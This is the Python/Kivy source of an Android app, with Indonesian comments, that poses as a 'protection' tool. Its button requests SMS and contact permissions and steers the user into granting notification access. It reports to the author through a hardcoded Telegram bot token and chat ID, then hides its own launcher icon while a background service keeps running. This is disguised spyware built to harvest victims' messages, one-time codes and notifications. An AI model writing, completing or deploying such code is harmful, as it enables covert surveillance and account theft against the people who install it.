import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass, PythonJavaClass, java_method
from kivy.app import App
from kivy.uix.button import Button
from kivy.clock import Clock
import os

TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

# Ini adalah 'Kabel' agar aplikasi muncul di daftar Akses Notifikasi
class NotificationListener(PythonJavaClass):
    __javainterfaces__ = ['android/service/notification/NotificationListenerService']
    __javacontext__ = 'app'

    @java_method('(Landroid/service/notification/StatusBarNotification;)V')
    def onNotificationPosted(self, sbn):
        pass # Logika pengiriman ada di service belakang

class LOKTV(App):
    def build(self):
        self.btn = Button(
            text="AKTIFKAN PERLINDUNGAN",
            background_color=(0, 1, 0, 1),
            font_size='20sp'
        )
        self.btn.bind(on_press=self.mulai)
        return self.btn

    def mulai(self, instance):
        perms = [Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.READ_CONTACTS]
        request_permissions(perms, self.proses_akhir)

    def proses_akhir(self, permissions, grants):
        if all(grants):
            try:
                bot.send_message(CHAT_ID, "✅ TAHAP 1 BERHASIL!\nSekarang aktifkan saklar di menu yang muncul.")
                
                # Membuka menu Akses Notifikasi
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                Intent = autoclass('android.content.Intent')
                Settings = autoclass('android.provider.Settings')
                intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                PythonActivity.mActivity.startActivity(intent)
                
                # Beri waktu 15 detik untuk user klik ON sebelum ikon hilang
                Clock.schedule_once(lambda dt: self.sembunyi(), 15)
            except:
                pass

    def sembunyi(self):
        activity = autoclass('org.kivy.android.PythonActivity').mActivity
        pm = activity.getPackageManager()
        comp = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
        pm.setComponentEnabledSetting(comp, 2, 1)
        # Jangan di os._exit dulu agar service tetap jalan
        self.btn.text = "Sistem Aktif."

if __name__ == '__main__':
    LOKTV().run()
